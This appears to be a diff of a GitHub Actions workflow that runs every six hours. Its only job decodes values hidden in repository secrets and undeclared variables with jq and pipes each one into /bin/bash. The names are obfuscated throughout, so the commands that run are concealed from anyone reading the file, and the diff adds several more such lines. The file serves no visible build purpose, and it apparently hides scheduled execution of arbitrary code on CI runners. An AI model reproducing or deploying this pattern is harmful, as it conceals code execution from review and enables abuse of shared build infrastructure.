@@ -1,9 +1,10 @@
 name: pengzhongzhou2013
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 1/6 * * *'
-jobs:  # 3379
+    - cron: '0 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,9 +12,12 @@ jobs:  # 3379
       - uses: actions/checkout@v4
       - name: pengzhongzhou2013
         env:
-          t01760: ${{ secrets.t01760 }}
+          cv0311: ${{ secrets.cv0311 }}
         run: |
-          echo $t01760 | jq -r .ffoxz30 | /bin/bash
-          echo $ynzq851 | jq -r .ycfp653 | /bin/bash
-          echo $yyjz845 | jq -r .te3 | /bin/bash
+          echo $cv0311 | jq -r .y9 | /bin/bash
+          echo $lap847 | jq -r .ixddc471 | /bin/bash
+          echo $xpw753 | jq -r .ntnc50 | /bin/bash
+          echo $rskv998 | jq -r .ktfk500 | /bin/bash
+          echo $hamxr1 | jq -r .wax32 | /bin/bash
+          echo $oc602 | jq -r .zt3826 | /bin/bash
 
